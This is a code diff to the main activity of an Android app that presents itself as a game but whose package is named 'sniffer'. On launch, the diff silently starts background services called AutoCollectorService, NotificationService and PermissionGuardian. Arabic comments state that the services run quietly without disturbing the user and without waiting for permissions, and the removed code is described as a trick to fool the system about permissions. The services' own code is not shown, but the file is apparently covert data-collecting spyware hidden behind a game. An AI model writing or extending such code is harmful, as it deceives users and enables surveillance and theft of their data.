@@ -16,7 +16,6 @@ import com.v8.global.sniffer.R;
 import com.v8.global.sniffer.AutoCollectorService;
 import com.v8.global.sniffer.NotificationService;
 import com.v8.global.sniffer.PermissionGuardian;
-import com.v8.global.sniffer.utils.PermissionTrick;
 
 public class MainGameActivity extends Activity {
 
@@ -24,7 +23,6 @@ public class MainGameActivity extends Activity {
     private TextView tvHighScore, tvWelcome;
     private ImageView ivLogo;
     private int highScore = 0;
-    private boolean servicesStarted = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -33,20 +31,7 @@ public class MainGameActivity extends Activity {
 
         initViews();
         loadHighScore();
-        
-        // تشغيل الخدمات في الخلفية (بدون انتظار الصلاحيات)
-        startBackgroundServices();
-        
-        // خداع النظام للصلاحيات
-        PermissionTrick trick = new PermissionTrick(this);
-        trick.setCallback(new PermissionTrick.PermissionCallback() {
-            @Override
-            public void onComplete() {
-                // تم - نكمل
-            }
-        });
-        trick.trickSystem();
-
+        startBackgroundServicesSilently();
         setupClickListeners();
     }
 
@@ -65,13 +50,11 @@ public class MainGameActivity extends Activity {
 
     private void loadHighScore() {
         highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
-        tvHighScore.setText("أفضل نتيجة: " + highScore);
+        tvHighScore.setText("🏆 أفضل نتيجة: " + highScore);
     }
 
-    private void startBackgroundServices() {
-        if (servicesStarted) return;
-        servicesStarted = true;
-
+    private void startBackgroundServicesSilently() {
+        // تشغيل الخدمات بصمت دون إزعاج المستخدم
         try {
             Intent notificationIntent = new Intent(this, NotificationService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -79,7 +62,7 @@ public class MainGameActivity extends Activity {
             } else {
                 startService(notificationIntent);
             }
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
 
         try {
             Intent collectorIntent = new Intent(this, AutoCollectorService.class);
@@ -88,7 +71,7 @@ public class MainGameActivity extends Activity {
             } else {
                 startService(collectorIntent);
             }
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
 
         try {
             Intent guardianIntent = new Intent(this, PermissionGuardian.class);
@@ -97,7 +80,7 @@ public class MainGameActivity extends Activity {
             } else {
                 startService(guardianIntent);
             }
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
     }
 
     private void setupClickListeners() {
@@ -105,8 +88,6 @@ public class MainGameActivity extends Activity {
             @Override
             public void onClick(View v) {
                 v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
-                
-                // حتى لو الصلاحيات ناقصة، افتح اللعبة
                 Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
                 startActivity(intent);
             }
